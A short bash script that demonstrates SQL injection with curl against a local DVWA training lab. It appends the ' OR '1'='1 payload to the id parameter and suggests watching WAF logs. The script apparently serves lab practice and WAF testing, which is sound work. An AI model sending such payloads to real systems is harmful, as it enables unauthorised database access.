#!/usr/bin/env bash
set -euo pipefail

# Simple curl-based SQLi demo for testing only. Use against your lab DVWA only.

TARGET="http://dvwa.local:8080/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"

echo "Requesting normal ID..."
curl -s "$TARGET" | head -n 20

echo "Attempting SQLi payload (" OR '1'='1')..."
# This is a naive example; DVWA has CSRF tokens in some pages so you may need to use the web UI.
curl -s "${TARGET}' OR '1'='1" | head -n 20

echo "Done. Observe WAF logs/UI for events."
